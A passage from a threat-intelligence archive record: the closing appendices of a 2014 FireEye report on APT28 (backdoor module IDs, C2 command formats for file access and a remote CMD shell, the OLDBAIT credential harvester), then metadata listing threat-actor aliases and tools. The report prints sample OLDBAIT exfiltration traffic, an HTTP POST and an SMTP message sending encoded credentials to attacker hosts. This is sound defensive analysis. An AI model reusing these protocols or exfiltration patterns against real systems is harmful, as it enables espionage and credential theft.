files.|\n|0x1301|modProcRet|Remote command shell access.|\n\n|Module ID|Internal Module Name|Description|\n|---|---|---|\n|0x0002|kernel|Kernel, probably version 2. Handles communication between modules and C2 tunnels.|\n|0x1002||Logs keystrokes and takes screen captures.|\n|0x1102||Facilitates filesystem access, such as directory browsing along with reading, deleting and opening files.|\n|0x1302||Remote command shell access.|\n|0x1602||Load additional DLLs.|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nThe kernel IDs 0x0001 and 0x0002 indicate different versions. The corresponding modules in each\nbackdoor also are consistently identified with 0x01 and 0x02, respectively, in the second byte. In both\nvariants the modules with keystroke log, file system access, and command shell capabilities have the\nconsistent identifiers 0x10, 0x11, and 0x13, respectively, in the first byte. This suggests that the first byte\nin the module ID identifies the module type whereas the second byte identifies the kernel version.\n\nThe kernel sends commands to each module using its module ID. The commands that each module\nunderstands are likely consistent from build to build. Table 14 and Table 15 show examples of commands\nthat each module understands.\n\n**Table 14:** Commands understood by modFS (0x1101) module\n\n**Command ID** **Description** **Example**\n\n01 Find file \\x01\\x11\\x01Directory&file&[01]\n\n02 Read file \\x01\\x11\\x02Directory&file&[01]\n\n03 Write file \\x01\\x11\\x03Directory&file&[Contents]\n\n04 Delete file \\x01\\x11\\x04Directory&file&[01]\n\n05 Execute file \\x01\\x11\\x05Directory&file&[01]\n\n**Table 15:** Commands understood by modProcRet (0x1301) module\n\n|Command ID|Description|Example|\n|---|---|---|\n|01|Find file|\\x01\\x11\\x01Directory&file&[01]|\n|02|Read file|\\x01\\x11\\x02Directory&file&[01]|\n|03|Write file|\\x01\\x11\\x03Directory&file&[Contents]|\n|04|Delete file|\\x01\\x11\\x04Directory&file&[01]|\n|05|Execute file|\\x01\\x11\\x05Directory&file&[01]|\n\n|Command ID|Description|Example|\n|---|---|---|\n|00|CMD.exe output|\\x01\\x13\\x00[Output]|\n|01|CMD.exe start|\\x01\\x13\\x01|\n|02|CMD.exe exit|\\x01\\x13\\x02|\n|11|CMD.exe input|\\x01\\x13\\x11[Input]|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### APPENDIX E:\n OLDBAIT\n\nOLDBAIT is a credential harvester that installs itself in %ALLUSERPROFILE%\\\\Application Data\\\nMicrosoft\\MediaPlayer\\updatewindws.exe. There is a missing space in the MediaPlayer directory and\nthe filename is missing the ‘o’ character. Both the internal strings and logic are obfuscated and are\nunpacked at startup. Credentials for the following applications are collected:\n\n               - Internet Explorer\n\n               - Mozilla Firefox\n\n               - Eudora\n\n               - The Bat! (an email client made by a Moldovan company)\n\n               - Becky! (an email client made by a Japanese company)\n\nBoth email and HTTP can be used to send out the collected credentials.  Sample HTTP traffic is\ndisplayed in Figure 15.\n\n\n**Figure 15: Example OLDBAIT HTTP traffic**\n\nPOST /index.php HTTP/1.0\n\nAccept: text/html\nAccept-Language: en-us\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6482\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nHost: windous.kz\nConnection: Keep-Alive\nPragma: no-cache\n\nprefs=C789Cu0Zacq7acr0D7LUawy6CY4REIaZBciWc6yVCN--cut-\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n**Figure 16: Example OLDBAIT SMTP traffic**\n\nFrom: lisa.cuddy@wind0ws.kz\nTo: dr.house@wind0ws.kz\nSubject: photo(9a3d8ea4-test)\nDate: Tue, 23 Sep 2014 15:42:56 -0500\nMIME-Version: 1.0\nContent-Type: text/plain;\ncharset=”us-ascii”\nContent-Transfer-Encoding: 7bit\nX-Priority: 3\nX-MSMail-Priority: Normal\nX-Mailer: Microsoft Outlook Express 6.00.2900.2670\nX-MimeOLE: Produced By Microsoft MimeOLE v6.00.2900.2670\nX-Spam: Not detected\n\n===STARTPOINT===\nqVV5KyHocV3FkUeENvu9LnVIlRB0YTa7xhoTwhRlIBBI7gRzVxikQXDRkdy4vGt1WfBtg9Utzbny\nUh+usXJHZ9Esecqq0UKg5Ul1O2E2OiyBTnGDPdP00UMRx/E+2it/10wQyH/epo8zuLnCuxPe7B+K\n--cut--hU+MWBLP+7h5ZojN\n===ENDPOINT===\n\nOLDBAIT handles APIs very similarly to SOURFACE and EVILTOSS. There is a setup routine that loads\nthe imports into a table and all API calls reference an index to this table. In SOURFACE and EVILTOSS the\ntable is stored in a global variable while in OLDBAIT this table is allocated at runtime and a pointer is\npassed between functions.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nFireEye, Inc. | 1440 McCarthy Blvd. Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com\n\n© 2014 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, Inc.\nAll other brands, products, or service names are or may be trademarks or service marks of\ntheir respective owners. SP.APT28.EN-US.102014\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        }
    ],
    "references": [
        "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf"
    ],
    "report_names": [
        "rpt-apt28.pdf"
    ],
    "threat_actors": [
        {
            "id": "8e1bae2f-2a21-4ba8-a6f1-42155f96aec8",
            "created_at": "2022-10-25T16:07:23.645758Z",
            "updated_at": "2025-03-27T02:02:09.905135Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Ajax Security Team",
                "Flying Kitten",
                "Group 26",
                "Operation Saffron Rose"
            ],
            "source_name": "ETDA:Flying Kitten",
            "tools": [
                "Stealer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "81dde5cc-c29f-430d-8c6e-e5e92d5015e7",
            "created_at": "2022-10-25T16:07:23.704358Z",
            "updated_at": "2025-03-27T02:02:09.932453Z",
            "deleted_at": null,
            "main_name": "Harvester",
            "aliases": [],
            "source_name": "ETDA:Harvester",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Graphon",
                "Metasploit",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8faa11f5-2a14-479c-9ea8-3779e6de9749",
            "created_at": "2022-10-25T15:50:23.814205Z",
            "updated_at": "2025-03-27T02:00:55.551798Z",
            "deleted_at": null,
            "main_name": "Ajax Security Team",
            "aliases": [
                "Ajax Security Team",
                "Operation Woolen-Goldfish",
                "AjaxTM",
                "Rocket Kitten",
                "Flying Kitten",
                "Operation Saffron Rose"
            ],
            "source_name": "MITRE:Ajax Security Team",
            "tools": [
                "sqlmap",
                "Havij"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d18fe42c-8407-4f96-aee0-a04e6dce219a",
            "created_at": "2023-01-06T13:46:38.275292Z",
            "updated_at": "2025-03-27T02:00:02.79092Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "Calc Team",
                "IXESHE",
                "BRONZE GLOBE",
                "BeeBus",
                "DynCalc",
                "DNSCalc",
                "Crimson Iron",
                "NUMBERED PANDA",
                "TG-2754",
                "Group 22"
            ],
            "source_name": "MISPGALAXY:APT12",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f4d7cba1-dbdd-42a9-88c5-4d0c81659ee0",
            "created_at": "2023-01-06T13:46:38.357581Z",
            "updated_at": "2025-03-27T02:00:02.813318Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Saffron Rose",
                "AjaxSecurityTeam",
                "Ajax Security Team",
                "Group 26",
                "Sayad",
                "SaffronRose"
            ],
            "source_name": "MISPGALAXY:Flying Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6a660ea2-1118-404a-9f8f-f0d6a1e9f184",
            "created_at": "2022-10-25T15:50:23.685924Z",
            "updated_at": "2025-03-27T02:00:55.52357Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "APT12",
                "IXESHE",
                "DynCalc",
                "Numbered Panda",
                "DNSCALC"
            ],
            "source_name": "MITRE:APT12",
            "tools": [
                "Ixeshe",
                "RIPTIDE",
                "HTRAN"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e6e26922-3f4f-4243-9af5-cf9bea8b93bd",
            "created_at": "2022-10-25T16:47:55.577163Z",
            "updated_at": "2025-03-27T02:05:17.26824Z",
            "deleted_at": null,
            "main_name": "BRONZE GLOBE",
            "aliases": [
                "CTG-8223 ",
                "DNSCalc",
                "DyncCalc",
                "Numbered Panda ",
                "APT12 "
            ],
            "source_name": "Secureworks:BRONZE GLOBE",
            "tools": [
                " BeepService",
                " Etumbot",
                " Gh0st RAT",
                " Ixeshe",
                " Mswab",
                " RAdmin",
                " Seatran",
                " SvcInstaller",
                " Ziyang",
                "Badpuck"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1414434530,
    "ts_modification_date": 1414434572,
    "files": {
        "pdf": "https://archive.orkl.eu/89a6a1486886ca4667af9ae96d95b6a4f658e7bd.pdf",
        "text": "https://archive.orkl.eu/89a6a1486886ca4667af9ae96d95b6a4f658e7bd.txt",
        "img": "https://archive.orkl.eu/89a6a1486886ca4667af9ae96d95b6a4f658e7bd.jpg"
    }
}